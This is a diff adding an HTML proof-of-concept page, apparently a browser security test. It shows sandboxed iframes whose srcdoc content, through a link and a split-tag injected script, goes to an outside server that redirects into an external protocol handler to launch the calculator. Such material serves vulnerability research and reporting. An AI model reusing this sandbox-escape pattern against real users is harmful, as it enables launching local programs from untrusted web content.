@@ -1,0 +1,22 @@
+<!doctype html>
+<html>
+<head>
+<style>html { font-family: sans-serif; }</style>
+</head>
+<body>
+<h1>Server-side redirect by attacker (calc) in iframe with srcdoc (sandboxed)</h1>
+<p>Behavior is the same whether sandboxed or not</p>
+
+<p>First iframe is fully sandboxed</p>
+<iframe sandbox id="frame1"></iframe>
+
+<p>Second iframe has sandbox="allow-scripts"</p>
+<iframe sandbox="allow-scripts" id="frame2"></iframe>
+
+<script>
+frame1.srcdoc = '<a href="https://aogarantiza.com/chromium/external-protocol/calc.php">Click</a>';
+frame2.srcdoc = '<'+'script'+'>document.write(window.origin);window.location="https://aogarantiza.com/chromium/external-protocol/calc.php";<'+'/script'+'>srcdoc test';
+</script>
+
+</body>
+</html>
